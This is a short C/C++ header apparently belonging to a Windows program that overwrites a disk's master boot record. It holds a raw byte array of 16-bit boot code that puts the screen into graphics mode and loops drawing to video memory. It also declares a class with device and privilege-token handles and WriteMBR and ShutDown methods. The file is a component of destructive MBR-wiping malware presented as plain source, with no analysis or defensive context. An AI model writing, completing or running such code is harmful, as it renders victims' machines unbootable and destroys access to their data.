#ifndef _DISKOPERATION_
#define _DISKOPERATION_

#define MAXMBRSIZE 2048



const BYTE MBRCODE[] = {
	0xB8, 0x13, 0x00, 0xCD, 0x10, 0xB8, 0x00, 0xA0, 0x8E, 0xC0, 0x31, 0xDB,
	0xE8, 0x19, 0x00, 0xE8, 0x25, 0x00, 0xB9, 0x04, 0x00, 0x26, 0x8A, 0x07,
	0x00, 0xD0, 0x26, 0x88, 0x07, 0x83, 0xC3, 0x01, 0xE2, 0xF3, 0x81, 0xC3,
	0x3C, 0x01, 0xEB, 0xE4, 0xB8, 0x00, 0x10, 0xE8, 0x13, 0x00, 0x25, 0xF0,
	0x00, 0x83, 0xC8, 0x0A, 0x88, 0xC2, 0xC3, 0xB8, 0xAD, 0x13, 0xE8, 0x04,
	0x00, 0x83, 0xE8, 0x7F, 0xC3, 0x89, 0xD8, 0x69, 0xC0, 0x2D, 0x15, 0x05,
	0x1D, 0x27, 0x89, 0xC3, 0x88, 0xD8, 0xC3
};


class DiskOperation
{
private:
	HANDLE hDevice;
	BOOL writeDevice;
	DWORD dwBytesWritten, dwBytesReturned;
	BYTE pMBR[MAXMBRSIZE];
	HANDLE hToken;
	TOKEN_PRIVILEGES tokenPrivileges;
public:
	DiskOperation()
	{
		hDevice = NULL;
		writeDevice = NULL;
		hToken = NULL;
		dwBytesWritten = 0, dwBytesReturned = 0;
		memset(&pMBR, 0, sizeof(pMBR));
		memset(&tokenPrivileges, 0, sizeof(tokenPrivileges));
	}
	bool WriteMBR();
	void ShutDown();
};


#endif